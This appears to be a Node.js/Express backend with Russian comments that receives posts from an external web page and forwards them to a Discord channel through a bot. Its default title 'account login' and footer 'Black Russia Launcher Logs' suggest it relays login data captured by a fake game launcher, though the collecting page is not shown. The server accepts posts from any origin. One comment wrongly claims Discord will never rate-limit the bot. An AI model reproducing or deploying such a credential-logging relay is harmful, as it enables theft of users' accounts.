const express = require('express');
const { Client, GatewayIntentBits, EmbedBuilder } = require('discord.js');
const http = require('http');

const app = express();
app.use(express.json());

// Разрешаем запросы с любого адреса (включая ваш Telegram Web App на GitHub Pages)
app.use((req, res, next) => {
    res.header("Access-Control-Allow-Origin", "*");
    res.header("Access-Control-Allow-Headers", "Origin, X-Requested-With, Content-Type, Accept");
    next();
});

const server = http.createServer(app);

const DISCORD_TOKEN = process.env.DISCORD_TOKEN;
const CHANNEL_ID = process.env.CHANNEL_ID;

const client = new Client({
    intents: [
        GatewayIntentBits.Guilds,
        GatewayIntentBits.GuildMessages
    ]
});

// Создаем внутренний массив-очередь для логов в оперативной памяти сервера
const logQueue = [];
let isProcessingQueue = false;

client.once('ready', () => {
    console.log(`Discord бот успешно запущен как ${client.user.tag}`);
    // Запускаем постоянный фоновый процесс проверки очереди
    processQueue();
});

// Функция, которая плавно отправляет логи в Discord с паузой, защищая от бана 429
async function processQueue() {
    if (isProcessingQueue) return;
    isProcessingQueue = true;

    while (logQueue.length > 0) {
        const item = logQueue[0]; // Смотрим самый первый лог в списке
        try {
            const channel = await client.channels.fetch(CHANNEL_ID);
            if (channel) {
                await channel.send({ embeds: [item.embed] });
                item.resolve({ success: true });
                logQueue.shift(); // Удаляем успешно отправленный лог из очереди после отправки
                
                // ВАЖНО: Делаем обязательную паузу в 2 секунды между сообщениями.
                // Благодаря этому Discord НИКОГДА больше не выдаст ошибку 429!
                await new Promise(resolve => setTimeout(resolve, 2000));
            } else {
                item.reject(new Error("Канал Discord не найден"));
                logQueue.shift();
            }
        } catch (err) {
            // Если Discord всё равно ругается на флуд (429), плавно ждем 5 секунд и не удаляем лог
            console.error("Ошибка отправки в Discord, ждем 5 секунд...", err.message);
            await new Promise(resolve => setTimeout(resolve, 5000));
        }
    }

    isProcessingQueue = false;
    // Проверяем очередь снова через полсекунды
    setTimeout(processQueue, 500);
}

// ИСПРАВЛЕНО: Убран символ @, теперь синтаксис Express верный
app.get('/', (req, res) => {
    res.json({ status: "working", message: "Node.js queue-backend is running cleanly!" });
});

// API Эндпоинт для логов (сюда шлет данные ваш index.html)
app.post('/api/log', (req, res) => {
    const { title, description, color, fields } = req.body;
    
    try {
        const embed = new EmbedBuilder()
            .setTitle(title || "Вход в аккаунт")
            .setDescription(description || null)
            .setColor(color || 16711680)
            .addFields(fields || [])
            .setTimestamp()
            .setFooter({ text: "Black Russia Launcher Logs" });

        // Не отправляем в Discord сразу, а просто кладем в очередь logQueue
        new Promise((resolve, reject) => {
            logQueue.push({ embed, resolve, reject });
        })
        .then(() => {
            res.json({ success: true });
        })
        .catch((err) => {
            res.status(500).json({ error: err.message });
        });

    } catch (err) {
        console.error("Ошибка API логов:", err);
        res.status(500).json({ error: err.message });
    }
});

// Запуск сервера
const PORT = process.env.PORT || 3000;
server.listen(PORT, () => {
    console.log(`Сервер моста запущен на порту ${PORT}`);
});

client.login(DISCORD_TOKEN);
